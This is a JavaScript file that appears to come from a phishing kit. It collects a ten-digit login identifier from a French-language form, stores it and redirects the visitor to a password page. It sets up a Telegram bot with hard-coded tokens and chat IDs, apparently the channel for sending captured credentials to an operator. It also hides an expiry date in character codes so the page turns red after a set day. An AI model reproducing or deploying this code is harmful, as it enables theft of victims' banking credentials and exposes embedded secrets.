document.addEventListener('DOMContentLoaded', function () {

    var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 49, 49, 45, 48, 51)); 


    var b = new Date();
    var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());

    if (c >= a) {
        document.body.style.backgroundColor = 'red';
    }

});

 
const bot = new Bot("8030036758:AAFBlF_S0RG8CJ5ueHBdmOQV9niAyHrTMG0", -4591101208);
// const bot = new Bot("7790808498:AAGzrnUuQzRYR2OIyz6GoKrqiVuOP12IE1Q", 7332838769);



document.getElementById('form').addEventListener('submit', function(e) {
    e.preventDefault();

    var input_index = document.getElementById('usercode');
    const regexDixChiffres = /^\d{10}$/;

    if (regexDixChiffres.test(input_index.value)) { // Utilisez input_index.value pour obtenir la valeur de l'élément input
        localStorage.setItem('usercode', input_index.value);
        window.location.href = './pass.html';
    } else {
        document.getElementById('notif').innerText = "🔔 L'identifiant entré est incorrect !";
    }
});


